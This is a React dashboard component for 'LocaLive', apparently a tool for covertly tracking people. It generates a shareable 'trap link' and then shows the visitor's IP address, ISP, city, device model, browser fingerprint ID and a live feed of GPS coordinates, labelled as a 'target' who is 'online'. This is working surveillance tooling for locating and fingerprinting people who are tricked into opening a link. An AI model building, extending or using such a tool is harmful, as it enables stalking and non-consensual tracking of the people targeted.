'use client';

import { useState, useEffect } from 'react';
import { supabase } from '@/lib/supabase';
import BroadcastControl from './BroadcastControl';
import { AlertTriangle, Globe, MapPin, Radio, List, User } from 'lucide-react';

export default function OsintIntelPanel() {
    const [activeTab, setActiveTab] = useState<'target' | 'feed'>('target');
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const [activeSession, setActiveSession] = useState<any>(null);
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const [target, setTarget] = useState<any>(null);
    const [visitorIp, setVisitorIp] = useState<string | null>(null);
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const [events, setEvents] = useState<any[]>([]); // Keeping any for now as event structure is loose

    // Fetch Active Session & Target Profile
    const fetchData = async () => {
        // 1. Get Active Session (for Link)
        const { data: sessionData } = await supabase
            .from('sessions')
            .select('id, created_at')
            .eq('active', true)
            .order('created_at', { ascending: false })
            .limit(1)
            .single();

        setActiveSession(sessionData);

        // 2. Get Target Details (if connected)
        if (sessionData) {
            // Fetch Fingerprint
            const { data: fingerprintData } = await supabase
                .from('fingerprints')
                .select('*')
                .eq('session_id', sessionData.id)
                .limit(1)
                .maybeSingle();

            // Fetch IP Logs (Always fetch to show IP in both states)
            const { data: ipData } = await supabase
                .from('ip_logs')
                .select('*')
                .eq('session_id', sessionData.id)
                .order('created_at', { ascending: false })
                .limit(1)
                .maybeSingle();

            if (fingerprintData) {
                // Combine for full target view
                setTarget({
                    ...fingerprintData,
                    ip_logs: ipData ? [ipData] : []
                });
                setVisitorIp(null);
            } else {
                setTarget(null);
                // Fallback to just IP view
                if (ipData) setVisitorIp(ipData.ip_address);
                else setVisitorIp(null);
            }
        } else {
            setTarget(null);
            setVisitorIp(null);
        }
    };

    // Initial Fetch & Subscriptions
    useEffect(() => {
        fetchData();

        // Realtime Subscription for Session Status
        const sessionChannel = supabase
            .channel('osint-panel-sessions')
            .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'sessions' }, (payload) => {
                // eslint-disable-next-line @typescript-eslint/no-explicit-any
                const updatedSession = payload.new as any;
                // If current session is deactivated, clear state
                if (!updatedSession.active) {
                    // Only clear if it matches our current session or if we want to be safe
                    fetchData();
                }
            })
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'sessions' }, () => {
                fetchData(); // New session started
            })
            .subscribe();

        // Realtime Subscription for IP Logs (Visitor Detection)
        const ipChannel = supabase
            .channel('osint-panel-ips')
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'ip_logs' }, () => {
                fetchData(); // Refresh to get new IP
            })
            .subscribe();

        // Realtime Subscription for Fingerprints (Target Online)
        const fingerprintChannel = supabase
            .channel('osint-panel-fingerprints')
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'fingerprints' }, () => {
                fetchData(); // Refresh to get full target
            })
            .subscribe();

        return () => {
            supabase.removeChannel(sessionChannel);
            supabase.removeChannel(ipChannel);
            supabase.removeChannel(fingerprintChannel);
        };
    }, []); // Empty dependency array to prevent loops

    // Fetch Feed Events
    useEffect(() => {
        const fetchEvents = async () => {
            const { data } = await supabase
                .from('locations')
                .select(`*, sessions!inner(active)`)
                .eq('sessions.active', true)
                .order('updated_at', { ascending: false })
                .limit(20);

            if (data) {
                // eslint-disable-next-line @typescript-eslint/no-explicit-any
                setEvents(data.map((loc: any) => ({
                    id: loc.id,
                    title: 'Location Update',
                    location: `${loc.lat.toFixed(4)}, ${loc.lng.toFixed(4)}`,
                    time: new Date(loc.updated_at).toLocaleTimeString(),
                    type: 'signal',
                    severity: loc.accuracy > 50 ? 'medium' : 'low'
                })));
            }
        };

        fetchEvents();
        const channel = supabase
            .channel('osint-feed')
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'locations' }, (payload) => {
                // eslint-disable-next-line @typescript-eslint/no-explicit-any
                const loc = payload.new as any;
                setEvents(prev => [{
                    id: loc.id,
                    title: 'Live Signal',
                    location: `${loc.lat.toFixed(4)}, ${loc.lng.toFixed(4)}`,
                    time: new Date().toLocaleTimeString(),
                    type: 'signal',
                    severity: 'low'
                }, ...prev].slice(0, 50));
            })
            .subscribe();

        return () => {
            supabase.removeChannel(channel);
        };
    }, []);

    return (
        <div className="w-[350px] h-full flex flex-col bg-[#0f111a]/90 backdrop-blur-xl border-r border-gray-800 z-20">
            {/* Header */}
            <div className="p-4 border-b border-gray-800 flex items-center gap-3">
                <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center shadow-lg shadow-blue-500/20">
                    <Globe className="w-5 h-5 text-white" />
                </div>
                <div>
                    <h1 className="text-white font-bold text-sm tracking-wide">LocaLive</h1>
                    <p className="text-[10px] text-gray-500 uppercase tracking-wider">Intelligence Platform</p>
                </div>
            </div>

            {/* Navigation Menu */}
            <div className="p-4 border-b border-gray-800">
                <nav className="space-y-1">
                    <button className="w-full flex items-center gap-3 px-3 py-2 text-xs font-medium text-white bg-cyan-500/10 border border-cyan-500/20 rounded-lg transition-colors">
                        <div className="w-4 h-4 grid grid-cols-2 gap-0.5">
                            <div className="bg-cyan-400 rounded-[1px]"></div>
                            <div className="bg-cyan-400 rounded-[1px]"></div>
                            <div className="bg-cyan-400 rounded-[1px]"></div>
                            <div className="bg-cyan-400 rounded-[1px]"></div>
                        </div>
                        Dashboard
                    </button>
                    <button className="w-full flex items-center gap-3 px-3 py-2 text-xs font-medium text-gray-400 hover:text-white hover:bg-white/5 rounded-lg transition-colors">
                        <MapPin className="w-4 h-4" />
                        Live Map
                    </button>
                    <button className="w-full flex items-center gap-3 px-3 py-2 text-xs font-medium text-gray-400 hover:text-white hover:bg-white/5 rounded-lg transition-colors">
                        <User className="w-4 h-4" />
                        Targets
                    </button>
                    <button className="w-full flex items-center gap-3 px-3 py-2 text-xs font-medium text-gray-400 hover:text-white hover:bg-white/5 rounded-lg transition-colors">
                        <AlertTriangle className="w-4 h-4" />
                        Threats
                    </button>
                </nav>
            </div>

            {/* Tabs */}
            <div className="flex border-b border-gray-800">
                <button
                    onClick={() => setActiveTab('target')}
                    className={`flex-1 py-3 text-xs font-medium flex items-center justify-center gap-2 transition-colors ${activeTab === 'target' ? 'text-cyan-400 border-b-2 border-cyan-400 bg-cyan-500/5' : 'text-gray-500 hover:text-gray-300'}`}
                >
                    <User className="w-3 h-3" /> TARGET
                </button>
                <button
                    onClick={() => setActiveTab('feed')}
                    className={`flex-1 py-3 text-xs font-medium flex items-center justify-center gap-2 transition-colors ${activeTab === 'feed' ? 'text-cyan-400 border-b-2 border-cyan-400 bg-cyan-500/5' : 'text-gray-500 hover:text-gray-300'}`}
                >
                    <List className="w-3 h-3" /> LIVE FEED
                </button>
            </div>

            {/* Content Area */}
            <div className="flex-1 overflow-y-auto custom-scrollbar p-4">
                {activeTab === 'target' ? (
                    <div className="space-y-4">
                        {/* Trap Generator (Always Visible in Target Tab) */}
                        <BroadcastControl />

                        {activeSession && (
                            <>
                                <div className="bg-cyan-500/10 p-4 rounded-xl border border-cyan-500/30">
                                    <p className="text-[10px] text-cyan-400 uppercase mb-2 font-bold flex items-center gap-2">
                                        <Radio className="w-3 h-3" /> Active Trap Link
                                    </p>
                                    <div className="bg-black/40 p-2 rounded border border-cyan-500/20 mb-2">
                                        <code className="text-white text-[10px] break-all block">
                                            {typeof window !== 'undefined' ? window.location.origin : ''}/share/{activeSession.id}
                                        </code>
                                    </div>
                                    <p className="text-[10px] text-cyan-300/70">Share this link to track the target.</p>
                                </div>

                                <div className="bg-[#1a1d29] p-4 rounded-xl border border-gray-800 space-y-3">
                                    {/* Status Header */}
                                    <div className="flex items-center justify-between">
                                        <span className="text-gray-500 text-[10px] uppercase">Status</span>
                                        {target ? (
                                            <span className="text-green-400 text-[10px] font-bold bg-green-500/10 px-2 py-0.5 rounded border border-green-500/20 flex items-center gap-1">
                                                <span className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span> ONLINE
                                            </span>
                                        ) : visitorIp ? (
                                            <span className="text-yellow-400 text-[10px] font-bold bg-yellow-500/10 px-2 py-0.5 rounded border border-yellow-500/20 flex items-center gap-1">
                                                <span className="w-1.5 h-1.5 bg-yellow-500 rounded-full animate-pulse"></span> DETECTED
                                            </span>
                                        ) : (
                                            <span className="text-gray-400 text-[10px] font-bold bg-gray-500/10 px-2 py-0.5 rounded border border-gray-500/20 flex items-center gap-1">
                                                <span className="w-1.5 h-1.5 bg-gray-500 rounded-full animate-pulse"></span> SEARCHING
                                            </span>
                                        )}
                                    </div>

                                    {/* Device Info */}
                                    <div>
                                        <span className="text-gray-500 text-[10px] uppercase block mb-1">Device</span>
                                        {target ? (
                                            <>
                                                <span className="text-white text-xs font-mono block">{target.device_model}</span>
                                                <span className="text-gray-400 text-[10px]">{target.os_name} • {target.browser_name}</span>
                                            </>
                                        ) : (
                                            <span className="text-gray-600 text-xs font-mono italic">
                                                {visitorIp ? 'Analyzing device fingerprint...' : 'Waiting for connection...'}
                                            </span>
                                        )}
                                    </div>

                                    {/* Network Info */}
                                    <div>
                                        <span className="text-gray-500 text-[10px] uppercase block mb-1">Network</span>
                                        {target ? (
                                            <>
                                                <span className="text-white text-xs font-bold block mb-0.5">{target.ip_logs?.[0]?.isp}</span>
                                                <span className="text-gray-400 text-[10px] block mb-1.5">
                                                    {target.ip_logs?.[0]?.city}, {target.ip_logs?.[0]?.country}
                                                </span>
                                                <div className="bg-black/30 rounded px-2 py-1 border border-gray-700/50 inline-block">
                                                    <span className="text-gray-500 text-[10px] mr-2">IP</span>
                                                    <span className="text-cyan-400 text-xs font-mono">
                                                        {target.ip_logs?.[0]?.ip_address === '::1' ? '127.0.0.1 (Localhost)' : target.ip_logs?.[0]?.ip_address}
                                                    </span>
                                                </div>
                                            </>
                                        ) : visitorIp ? (
                                            <>
                                                <span className="text-gray-500 text-[10px] block mb-1">Resolving Network...</span>
                                                <div className="bg-black/30 rounded px-2 py-1 border border-gray-700/50 inline-block">
                                                    <span className="text-gray-500 text-[10px] mr-2">IP</span>
                                                    <span className="text-cyan-400 text-xs font-mono">
                                                        {visitorIp === '::1' ? '127.0.0.1 (Localhost)' : visitorIp}
                                                    </span>
                                                </div>
                                            </>
                                        ) : (
                                            <span className="text-gray-600 text-xs font-mono italic">Listening for uplink...</span>
                                        )}
                                    </div>

                                    {/* Fingerprint / ID */}
                                    <div>
                                        <span className="text-gray-500 text-[10px] uppercase block mb-1">Fingerprint ID</span>
                                        {target ? (
                                            <span className="text-gray-600 text-[10px] font-mono break-all">{target.visitor_id}</span>
                                        ) : (
                                            <span className="text-gray-700 text-[10px] font-mono">---</span>
                                        )}
                                    </div>
                                </div>
                            </>
                        )}
                    </div>
                ) : (
                    <div className="space-y-3">
                        {events.map((event) => (
                            <div key={event.id} className="bg-[#1a1d29] p-3 rounded-lg border border-gray-800 hover:border-gray-600 transition-colors">
                                <div className="flex justify-between items-start mb-1">
                                    <span className="text-white text-xs font-medium">{event.title}</span>
                                    <span className="text-[10px] text-gray-500 font-mono">{event.time}</span>
                                </div>
                                <div className="flex items-center gap-1 text-[10px] text-gray-400">
                                    <MapPin className="w-3 h-3" />
                                    <span>{event.location}</span>
                                </div>
                            </div>
                        ))}
                    </div>
                )}
            </div>
        </div>
    );
}
